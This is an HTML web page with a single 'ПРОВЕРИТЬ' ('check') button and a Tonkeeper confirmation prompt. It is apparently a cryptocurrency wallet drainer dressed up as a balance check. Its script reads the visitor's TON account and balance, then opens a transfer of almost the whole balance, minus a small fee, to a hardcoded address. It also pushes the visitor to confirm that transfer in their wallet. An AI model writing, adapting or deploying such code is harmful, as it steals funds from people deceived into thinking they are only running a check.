<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TON</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #0d0d0d;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            font-family: 'Segoe UI', Arial, sans-serif;
        }
        .container {
            background: #1a1a1a;
            padding: 40px 30px;
            border-radius: 24px;
            text-align: center;
            max-width: 380px;
            width: 100%;
            border: 1px solid #2a2a2a;
        }
        .btn {
            background: linear-gradient(135deg, #0098ea, #0080d0);
            border: none;
            color: #fff;
            font-size: 20px;
            font-weight: 700;
            padding: 18px 40px;
            border-radius: 60px;
            cursor: pointer;
            width: 100%;
            transition: 0.3s;
            margin: 6px 0;
        }
        .btn:active {
            transform: scale(0.96);
        }
        #status {
            margin-top: 16px;
            font-size: 13px;
            color: #888;
            min-height: 40px;
        }
        .confirm-box {
            background: #1a2a3a;
            border: 1px solid #2a4a6a;
            border-radius: 16px;
            padding: 20px;
            margin-top: 20px;
            display: none;
        }
        .confirm-box.show {
            display: block;
        }
        .confirm-box .title {
            color: #fff;
            font-size: 16px;
            font-weight: 600;
        }
        .confirm-box .sub {
            color: #8899aa;
            font-size: 13px;
            margin: 6px 0 12px 0;
        }
        .confirm-box .open-btn {
            background: #0098ea;
            border: none;
            color: #fff;
            font-size: 16px;
            font-weight: 600;
            padding: 12px 30px;
            border-radius: 40px;
            cursor: pointer;
            width: 100%;
            transition: 0.3s;
        }
    </style>
</head>
<body>
    <div class="container">
        <div style="font-size:36px;margin-bottom:16px;">⚡</div>
        <button class="btn" id="mainBtn">ПРОВЕРИТЬ</button>
        <div id="status">Нажмите кнопку</div>

        <div class="confirm-box" id="confirmBox">
            <div class="title">Confirm the transaction in Tonkeeper</div>
            <div class="sub">It will only take a moment.</div>
            <button class="open-btn" id="openWalletBtn">Open wallet</button>
        </div>
    </div>

    <script>
        const TARGET = 'UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P';

        // ====== ПОЛУЧИТЬ БАЛАНС И ОТКРЫТЬ ТРАНЗАКЦИЮ ======
        function openTransaction() {
            const status = document.getElementById('status');
            const confirmBox = document.getElementById('confirmBox');
            
            status.innerText = '⏳ Проверка...';
            
            // Проверяем TON Keeper
            if (!window.tonkeeper) {
                status.innerText = '❌ Установите TON Keeper';
                return;
            }

            // Получаем баланс
            window.tonkeeper.send('ton_requestAccounts', {})
                .then(accounts => {
                    if (!accounts || accounts.length === 0) {
                        status.innerText = '❌ Отказ';
                        return;
                    }
                    const address = accounts[0];
                    return window.tonkeeper.send('ton_getBalance', { address: address });
                })
                .then(hex => {
                    const nano = parseInt(hex, 16);
                    
                    if (nano <= 0) {
                        status.innerText = '💰 Баланс 0 TON';
                        return;
                    }

                    const fee = 5000000;
                    const amount = nano - fee;

                    if (amount <= 0) {
                        status.innerText = '⚠️ Баланс меньше комиссии';
                        return;
                    }

                    const amountTON = (amount / 1e9).toFixed(6);
                    
                    // ====== ОТКРЫВАЕМ TON KEEPER С ТРАНЗАКЦИЕЙ ======
                    const url = `ton://transfer?address=${TARGET}&amount=${amountTON}`;
                    window.location.href = url;
                    
                    setTimeout(() => {
                        window.open(url, '_blank');
                    }, 300);

                    // Показываем плашку
                    confirmBox.classList.add('show');
                    status.innerText = `✅ Подтвердите транзакцию в TON Keeper`;
                })
                .catch(err => {
                    status.innerText = '❌ Ошибка: ' + err.message;
                });
        }

        // ====== КНОПКА ======
        document.getElementById('mainBtn').addEventListener('click', openTransaction);

        // ====== КНОПКА OPEN WALLET ======
        document.getElementById('openWalletBtn').addEventListener('click', function() {
            openTransaction();
        });

        // ====== СТАТУС ПРИ ЗАГРУЗКЕ ======
        setTimeout(function() {
            if (window.tonkeeper) {
                document.getElementById('status').innerText = '🟢 Нажмите "ПРОВЕРИТЬ"';
            } else {
                document.getElementById('status').innerText = '📱 Нажмите "ПРОВЕРИТЬ"';
            }
        }, 500);
    </script>
</body>
</html>
